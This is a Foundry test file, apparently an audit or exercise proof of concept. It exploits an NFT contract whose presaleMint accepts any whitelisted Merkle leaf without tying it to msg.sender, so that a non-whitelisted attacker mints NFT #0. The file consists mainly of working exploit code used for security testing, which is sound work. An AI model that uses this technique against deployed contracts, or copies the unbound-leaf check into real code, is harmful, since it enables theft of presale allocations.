// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import "../src/Furry.sol";

contract CounterTest is Test {
    FurryFoxFriends furry;
    bytes32 merkleRoot = 0xc947ddeae47a6fd5b11ad273122c92bcc4f04d6eb11d56105836588302c9c69a; 
    // This is the Merkle root generated from the script/MakeMerkle.sol script
    // It corresponds to the following addresses and their respective proof in the output.json file
    // and can be used to mint in the presale:
    // 0x6CA6d1e2D5347Bfab1d91e883F1915560e09129D
    // 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
    // 0x2ea3970Ed82D5b30be821FAAD4a731D35964F7dd
    // 0xf6dBa02C01AF48Cf926579F77C9f874Ca640D91D

    address attackerAddress;

    function setUp() public {
        furry = new FurryFoxFriends(merkleRoot);
        vm.label(address(furry), "FurryFoxFriends");

        attackerAddress = makeAddr("attacker");
        vm.label(attackerAddress, "Attacker");
    }

    function test_Attack() public {
        vm.startPrank(attackerAddress);
        
        // VULNERABILITY: The contract doesn't verify that the leaf corresponds to msg.sender
        // An attacker can use any valid leaf from the whitelist to mint
        
        // Use a valid proof and leaf from the whitelist
        bytes32[] memory proof = new bytes32[](2);
        proof[0] = 0x723077b8a1b173adc35e5f0e7e3662fd1208212cb629f9c128551ea7168da722;
        proof[1] = 0x3d0b73d59ce6f496e7f4dd84f9d35021be8d570990e1b7cc61b2dd5e55bfb475;
        
        bytes32 validLeaf = 0xb4260ebeada881f749f68942b3f0e36ae8ba2751d11fbbad46a58feb7b4cda51;
        
        // Successfully mint using presaleMint() without being on the whitelist
        furry.presaleMint(proof, validLeaf);
        
        // Verify the attack was successful
        assertEq(furry.ownerOf(0), attackerAddress);
        console.log("Attack successful! Attacker now owns NFT #0 using presaleMint()");
        
        vm.stopPrank();
    }
}
